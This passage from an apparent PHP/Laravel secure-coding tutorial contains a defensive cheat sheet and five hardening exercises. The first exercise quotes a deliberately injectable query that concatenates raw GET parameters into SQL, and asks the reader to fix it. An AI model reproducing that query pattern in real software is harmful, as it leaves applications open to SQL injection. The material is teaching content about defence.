A: HSTS forces HTTPS and blocks downgrade attacks; CSP restricts which script/style sources can execute (XSS mitigation); X-Frame-Options/`frame-ancestors` stops clickjacking via framing; X-Content-Type-Options: nosniff prevents MIME sniffing. Set them globally in middleware.

---

## 📋 Quick Reference / Cheat Sheet

```text
SQL injection      → PDO prepared statements; ATTR_EMULATE_PREPARES=false; Eloquent/Query Builder
                     identifiers (ORDER BY, columns) → allowlist, never bind
XSS                → htmlspecialchars($s, ENT_QUOTES|ENT_HTML5, 'UTF-8'); Blade {{ }}; @json for JS
                     CSP header as defense-in-depth; avoid {!! !!} on user input
CSRF               → per-session token + hash_equals() check; SameSite=Lax cookies; Laravel @csrf
Passwords          → password_hash(PASSWORD_DEFAULT|PASSWORD_ARGON2ID); password_verify();
                     password_needs_rehash(); NEVER md5/sha1; VARCHAR(255); Hash::make/check
Validation         → filter_var(FILTER_VALIDATE_*); allowlists & enums; $request->validate()
Mass assignment    → $fillable / $guarded; pass $request->validated()
File upload        → finfo MIME; size cap; random filename; store outside web root; no PHP exec
Sessions           → secure+httponly+samesite cookies; session_regenerate_id(true) at login;
                     use_strict_mode=1; Laravel regenerates on login/logout
Directory traversal→ realpath() + str_starts_with($target, $base.DIRECTORY_SEPARATOR); basename()
Command injection  → avoid shells; escapeshellarg(); proc_open([...]) with arg array
SSRF               → allowlist scheme/host; reject private IPs (NO_PRIV_RANGE|NO_RES_RANGE);
                     no redirect-following; short timeouts
Crypto             → encrypt = recoverable (AES-256-GCM / sodium_crypto_secretbox, authenticated);
                     hash = one-way; Laravel Crypt::encryptString (APP_KEY)
Timing             → hash_equals() for all secret comparisons
Randomness         → random_bytes() / random_int() (CSPRNG); never rand/mt_rand/uniqid
Secrets            → env / secret manager; .env in .gitignore; config() not env() in prod
Production config  → APP_DEBUG=false; display_errors=Off; log_errors=On
Headers            → HSTS, CSP, X-Frame-Options:DENY, X-Content-Type-Options:nosniff
Maintenance        → composer audit; keep PHP/Laravel/deps patched; least privilege
```

---

## 🧪 Mini Exercises

1. **SQLi audit & fix.** Given a legacy endpoint that builds `"SELECT * FROM products WHERE category = '" . $_GET['cat'] . "' ORDER BY " . $_GET['sort']`, rewrite it to be injection-safe. Parameterize the value *and* protect the `ORDER BY` with an allowlist. Explain why the two parts need different treatment.

2. **Password lifecycle.** Write a `login($email, $plain)` function that fetches a user, verifies the password with `password_verify`, and transparently upgrades the stored hash with `password_needs_rehash`/`password_hash` when the cost is outdated. Then explain what changes between PHP 8.3 and 8.4 for bcrypt's default cost.

3. **Context-aware encoding.** Build a small page that echoes a user-supplied `name` into three contexts: HTML body, an `href` attribute, and an inline `<script>` variable. Use the correct encoding for each context and state, for each, what would break if you used HTML-encoding everywhere.

4. **Upload hardening.** Implement an avatar upload that accepts only JPEG/PNG/WebP up to 1 MB, detects the real MIME with `finfo`, assigns a random filename, and stores the file outside the public web root. Add a check that rejects the upload if `is_uploaded_file` fails.

5. **SSRF guard.** Write `safeFetch(string $url): string` that allows only `https` URLs to hosts on an allowlist, resolves the host and rejects private/loopback/link-local IPs, disables redirect-following, and times out after 5 seconds. Describe one way an attacker might still try to bypass it (hint: DNS).
